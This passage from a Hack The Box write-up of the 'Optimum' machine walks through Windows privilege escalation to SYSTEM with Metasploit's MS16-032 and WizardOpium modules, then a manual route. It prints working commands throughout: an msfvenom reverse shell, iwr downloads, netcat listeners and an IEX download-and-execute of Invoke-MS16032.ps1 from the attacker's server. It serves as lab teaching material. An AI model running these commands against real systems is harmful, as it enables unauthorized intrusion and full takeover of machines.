Our first exploit of the two is **MS16-032 Secondary Logon Handle Privilege Escalation**. This module exploits a lack of sanitisation of standard handles within the Windows Secondary Logon Service. We'll take a closer look at its inner workings later in the _Beyond Root_ section.

We select the `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` module and use `show options` to check which parameters need to be configured. We use `setg` for both `SESSION` and `LHOST`, as these values won't change between the modules we're using. Unique to this exploit are the `PAYLOAD` selection and `TARGET` type, which we determined through some trial and error (not shown below).
```Shell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.243.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


View the full module info with the info, or info -d command.

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > setg SESSION 1
SESSION => 1

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > setg LHOST tun0
LHOST => tun0

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set PAYLOAD windows/x64/shell_reverse_tcp
PAYLOAD => windows/x64/shell_reverse_tcp

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Windows x86
    1   Windows x64

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set TARGET 1
```

We can then run the module and see that it completes successfully. This gives us a shell running in the context of `NT AUTHORITY\SYSTEM`, meaning we've successfully escalated our privileges and now have complete control over the system.
``` Shell
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.14.62:4444 
[+] Compressed size: 1160
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\IQzKdWJHa.ps1...
[*] Compressing script contents...
[+] Compressed size: 3729
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1324

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $g6 = [Ntdll]::NtImpersonateThread($kf, $kf, [ref]$bXF5)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (bXF5:VariablePath) [], RuntimeException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
nvert null to type "System.IntPtr"."
At line:259 char:2
+     $g6 = [Advapi32]::DuplicateToken($wf7Mt, 2, [ref]$by)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

DPmQ6qNJ0bYmq394RKL2p8fdgTp4I9Da
[+] Executed on target machine.
[*] Command shell session 2 opened (10.10.14.62:4444 -> 10.129.54.27:49172) at 2026-08-28 02:47:52 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\IQzKdWJHa.ps1


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\Users\kostas\Documents>whoami
whoami
nt authority\system
```


**CVE-2019-1458**

We can also test a secondary exploit. After closing our previous session, we can attempt to use **CVE-2019-1458**, labelled as **WizardOpium**. Interestingly, Metasploit identifies this as a Windows 7 x64-based exploit, yet it still works successfully against Optimum. We'll explore why this is the case later in the _Beyond Root_ section.

This exploit can be a little finicky, as the documentation lists it as a **one-shot attempt** exploit. If the exploit fails, the machine may need to be reset before we can try again. After some trial and error, we find that it works best with the default-configured payload and requires no additional changes to the global values we've already set.
```Shell
[*] 10.129.54.27 - Command shell session 2 closed.  Reason: User exit

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > use exploit/windows/local/cve_2019_1458_wizardopium 
[*] Using configured payload windows/x64/shell_reverse_tcp

msf exploit(windows/local/cve_2019_1458_wizardopium) > show options

Module options (exploit/windows/local/cve_2019_1458_wizardopium):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x64


View the full module info with the info, or info -d command.
```

When the conditions are right, the module launches successfully and gives us a new Meterpreter session running in the context of `NT AUTHORITY\SYSTEM`. Once again, we've successfully escalated our privileges to the highest level on the system, giving us complete control of the box.
```Shell
msf exploit(windows/local/cve_2019_1458_wizardopium) > run
[*] Started reverse TCP handler on 10.10.14.62:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 2968 launched.
[*] Reflectively injecting the DLL into 2968...
[*] Sending stage (230982 bytes) to 10.129.54.27
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.62:4444 -> 10.129.54.27:49170) at 2026-08-28 15:30:32 -0400

meterpreter > shell
Process 2904 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Documents>whoami
whoami
nt authority\system
```

#### Manual Enumeration and Exploitation

Let's step back for a moment and assume we don't want to rely on an automated framework to do all the work for us. In this case, we'll rewind to when we first dropped our `met.exe` shell onto the machine and take a different route instead. We can generate a standard reverse shell and forgo the Metasploit framework, giving us a more manual approach to privilege escalation.

We'll first use `msfvenom` to create a reverse TCP shell executable that we can transfer to the machine and execute later. We'll call this payload `rev.exe` for ease of use and simplicity.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.62 LPORT=1234 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```

We can use our initial CVE-2014-6287 shell access and Python 3 web server to transfer the file to the Optimum machine. Once it's in place, we'll start a Netcat listener ready to catch the incoming connection. We can then execute the binary and wait for our reverse shell to connect back.
```PowerShell
PS C:\Users\kostas\Documents> iwr -uri http://10.10.14.62/rev.exe -Outfile rev.exe

PS C:\Users\kostas\Documents> ./rev.exe
```

From here, we could repeat the process of running WinPEAS. As we've already covered the results from this enumeration, the example below serves as a demonstration of how we can perform the same stage of the process outside of the automated framework and its Meterpreter session we used earlier.
``` Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.54.27] 49177
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Documents

04/09/2026  08:27 ��    <DIR>          .
04/09/2026  08:27 ��    <DIR>          ..
04/09/2026  07:22 ��             7.680 met.exe
04/09/2026  08:27 ��                 0 pea.exe
04/09/2026  08:17 ��             7.680 rev.exe
               3 File(s)         15.360 bytes
               2 Dir(s)   5.628.948.480 bytes free

C:\Users\kostas\Documents>./pea.exe
```

#### Sherlock (Deprecated)

We've already discussed how old this machine is, and we'll once again be calling upon a deprecated tool for our analysis. We can use [Sherlock](https://github.com/rasta-mouse/Sherlock), which would have been a very relevant tool around the time this machine was active.

We download the tool from Rasta Mouse's GitHub repository, but we'll need to make a small modification to the script. When attempting to run Sherlock natively and / or through dot sourcing, we find that it is notorious for hanging on slower systems like Optimum, which in turn kills some of our shell sessions.

To prevent this from happening, we can explicitly add `Find-AllVulns` to the bottom of the `Sherlock.ps1` script. This means that when the script is executed, it will call only the `Find-AllVulns` function rather than attempting to run the full script and its associated functionality.
![Sherlock ScriptEdits]({{ '/assets/img/htb-optimum/Optimum_Sherlock_ScriptEdits.png' | relative_url }})

Once we've made the required edits, we can transfer the script to the Optimum machine using the same Python 3 web server we've had running in the background.
```PowerShell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/]                        
└─$ ls
Exploit  Scans  Sherlock.ps1

-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^[Kali]-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-
-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-[Optimum]-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-

PS C:\Users\kostas\Documents> iwr -uri http://10.10.14.62/Sherlock.ps1 -Outfile Sherlock.ps1
```

We attempt to run `Sherlock.ps1` from our newly created `rev.exe` shell to avoid the issues we encountered previously. Unfortunately, the result is another frozen and unresponsive shell. This is becoming very frustrating, so we'll make one final attempt to get the tool working before considering whether it's time to ditch it and move on.

``` Powershell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.54.27] 49186
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Documents>powershell
powershell
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Documents> ./Sherlock.ps1
```

Out of desperation, we run the tool from our original Nishang shell environment. Surprisingly, after giving it some time, Sherlock eventually completes and provides us with the output we were looking for. This gives us another useful example of how manual enumeration could have been approached at the time, with Sherlock being a relevant tool for identifying potential privilege escalation opportunities on a system of this age.
```Powershell
PS C:\Users\kostas\Documents> ./Sherlock.ps1 

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems                                                                                           

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable
Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053                               
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems                                                                                                                 

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081                                              
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems
Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058                                                         
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable
Title      : ClientCopyImage Win32k                                           
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable
Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078                                                                                                                                                                                                                       
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable
Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems                                                                                                                 

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?                                                                                                                                                                                                                         
VulnStatus : Appears Vulnerable
Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
             
VulnStatus : Appears Vulnerable
Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable   
```

The above is probably going to leave some readers a little confused about our earlier discussion around shell stability. One might reasonably be asking themselves, _“Well, which is it? Which shell is better, and what should I use?”_

The research below helps answer that question, with the TL;DR being: **neither is inherently better.** This is exactly why we do CTFs and experiments. We learn by understanding why things fail, how different tools behave in different environments, and which approach is appropriate for the job at hand.

Your tools are only as useful as your understanding of how to use them. We should always be asking ourselves: **what is the right tool for the environment we're currently working in?**

> **Shell Stability Differences**
> 
> This might look like a contradiction — earlier in this post, switching from the Nishang shell to the compiled reverse shell exe fixed a hang with LinPEAS/WinPEAS. Here, it's the opposite: the exe shell hangs and the Nishang shell doesn't.
> 
> The reason is that these two payloads aren't just "different shells," they're built completely differently under the hood:
> * The Nishang shell is a single PowerShell process using .NET's TcpClient directly for socket I/O. It has no subprocess or pipe relay in between — PowerShell talks straight to the socket.
> * The msfvenom exe shell works by spawning cmd.exe and redirecting its stdin/stdout/stderr onto the raw socket via OS-level pipes. That's a much thinner, more fragile mechanism — small pipe buffers, no retry logic, and no interactive session context.
> 
>  Which one "wins" comes down to what the specific tool does. A tool that produces a sudden burst of output (like LinPEAS) can overwhelm the buffering/rendering PowerShell tries to do over a busy .NET stream, so the raw pipe-based exe shell handles it better. But a tool like Sherlock that makes slow, DCOM/WMI-backed calls (Win32_QuickFixEngineering) needs a stable, well-behaved I/O channel to survive the RPC round-trip — something the thin cmd.exe pipe relay struggles with, while PowerShell's socket handling copes fine.
>  
>  The takeaway is that neither shell is "better" — they just fail differently depending on the tool's I/O pattern. When one hangs, it's often worth trying the other rather than assuming the target itself is the problem.

#### WES-NG

We can also reuse a solution we discovered during our previous walkthrough of the _Devel_ machine. There, we found a simple script that allows us to save the output of `systeminfo` to a file and perform the vulnerability checks locally on our Kali machine. As we've already covered how this works [here](https://hackopotamus.github.io/portfolio/writeups/2026-07-25-htb-devel/), we won't spend too much time going over the setup again. Instead, we'll simply run it and sample some of the results.

We copy the output from our earlier `systeminfo` command into `systeminfo.txt`, update the script as required, and then run it locally. The results give us a plethora of potential exploits, so we've filtered the output below to focus only on the two candidates we selected earlier.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/wesng]
└─$ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2012 R2
    - Generation: 2012 R2
    - Build: 9600
    - Version: None
    - Architecture: x64-based
    - Installed hotfixes (31): KB2959936, KB2896496, KB2919355, KB2920189, KB2928120, KB2931358, KB2931366, KB2933826, KB2938772, KB2949621, KB2954879, KB2958262, KB2958263, KB2961072, KB2965500, KB2966407, KB2967917, KB2971203, KB2971850, KB2973351, KB2973448, KB2975061, KB2976627, KB2977629, KB2981580, KB2987107, KB2989647, KB2998527, KB3000850, KB3003057, KB3014442
[+] Loading definitions
    - Creation date of definitions: 20260716
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Applying display filters
[!] Found vulnerabilities!

Date: 20160308
CVE: CVE-2016-0099
KB: KB3139914
Title: Security Update for Secondary Logon to Address Elevation of Privile
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/39574/, https://www.exploit-db.com/exploits/39719/, https://www.exploit-db.com/exploits/39809/, https://www.exploit-db.com/exploits/40107/

Date: 20191210
CVE: CVE-2019-1458
KB: KB4530730
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploits: http://packetstormsecurity.com/files/156651/Microsoft-Windows-WizardOpium-Local-Privilege-Escalation.html, http://packetstormsecurity.com/files/159569/Microsoft-Windows-Uninitialized-Variable-Local-Privilege-Escalation.html, https://exploit-db.com/exploits/48180
```

**MS16-032**

To finish, we'll manually exploit one of the vulnerabilities and complete the manual approach to this section. We'll use **MS16-032**, as it appears to be a little more stable than CVE-2019-1458. With that reasoning out of the way, we can focus on sourcing an exploit. We find a suitable candidate [here](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) that we can use for this demonstration.

After downloading and inspecting the exploit, we can see an example of how it can be used near the top of the script. Given the issues we encountered with Sherlock freezing our shell, it seems sensible to take some precautions here as well. We can add a self-call to the bottom of the script, instructing it to execute the `rev.exe` shell we previously transferred to the machine.

Using the absolute path to `rev.exe` removes any reliance on the current working directory and helps avoid another potential source of failure when the payload is executed.
![Invoke MS16 032 ScriptEdits]({{ '/assets/img/htb-optimum/Optimum_Invoke-MS16-032_ScriptEdits.png' | relative_url }})

Before doing anything else we first set up a netcat listenr to catch the connection once `rev.exe` is again executed. Afterwards with `Invoke-MS16032.ps1` edited and saved to our Kali machine, we can use the previous IEX command to download the file from our Python 3 webserver and run it in memory.
```PowerShell
PS C:\Users\kostas\Documents> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.62/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

Before doing anything else, we first set up a Netcat listener ready to catch the connection when `rev.exe` is executed again. With `Invoke-MS16032.ps1` edited and saved on our Kali machine, we can then use the same `IEX` command from earlier to download the script from our Python 3 web server and execute it directly in memory.

Once this executes, we receive a callback on our listener and can see that, one final time, we're running in the context of `NT AUTHORITY\SYSTEM`. This completes our manual exploitation process and, once again, gives us full control of the system.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.54.27] 49196
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Documents>whoami
whoami
nt authority\system
```

---

### Obtaining the Flags

As we've now explored multiple different ways onto the machine, our prize awaits. Rather than manually poking around the file system, we can use the `find` command to search for the flag. It's unlikely that the flag will be hidden somewhere unexpected, as we've come to expect certain locations on these machines, but this approach saves us a lot of unnecessary headaches if it has been placed somewhere else.

Once we locate the flag at `C:\Users\Administrator\Desktop\root.txt`, we can use the `type` command to display its contents. With both the user and root flags recovered, this completes the machine, and we've successfully owned another Hack The Box machine.
```PowerShell
C:\Users\kostas\Documents>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
dir C:\ /s /b /a:-d 2>nul | find "root.txt"
C:\Users\Administrator\Desktop\root.txt

C:\Users\kostas\Documents>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
[root flag redacted]
```

---
### Beyond Root

We've now taken several routes through Optimum, but one question remains: **why did we choose MS16-032 and WizardOpium from the many options available?**

The answer comes back to our enumeration. `local_exploit_suggester`, WES-NG and Sherlock all pointed towards the same conclusion: we're dealing with an old, poorly patched Windows system with several potential privilege escalation routes. Rather than blindly firing exploits at the box, we can use this information to narrow down what is worth investigating.

It's also important to remember that an exploit appearing in a database doesn't automatically mean it will work. We still need to consider the exact Windows version, build, architecture and patches.

#### Windows 7 and WizardOpium

WizardOpium initially looks like an odd choice because Metasploit lists Windows 7 x64 SP1 as its tested target, while Optimum runs Windows Server 2012 R2.

The important distinction is between the **CVE and the exploit implementation**. CVE-2019-1458 affects the Windows `win32k` subsystem and includes Windows Server 2012 and 2012 R2. The Metasploit module was tested against Windows 7, but that doesn't mean the underlying vulnerability is limited to Windows 7.

In other words:

> **The CVE tells us what is vulnerable; the exploit tells us how someone has chosen to exploit it.**

That gave us enough reason to test WizardOpium rather than dismissing it based purely on the module's tested target.

#### Comparing the Two Exploits

Both exploits ultimately give us the same result — `SYSTEM` — but they take very different paths.

**MS16-032** abuses the Windows Secondary Logon Service and privileged handle handling, while **WizardOpium** targets a vulnerability in the Windows `win32k` subsystem and abuses kernel-level behaviour to achieve privilege escalation.

For me, the interesting part isn't simply that both worked. It's understanding **why** they worked, why one may be more reliable than another, and how the environment affects our choices.

That lesson has appeared throughout this machine, from unstable shells to Sherlock freezing. The tools aren't the magic; **understanding how and when to use them is.**

Getting the flag proves we completed the machine. Understanding why we got the flag is what makes the exercise worthwhile.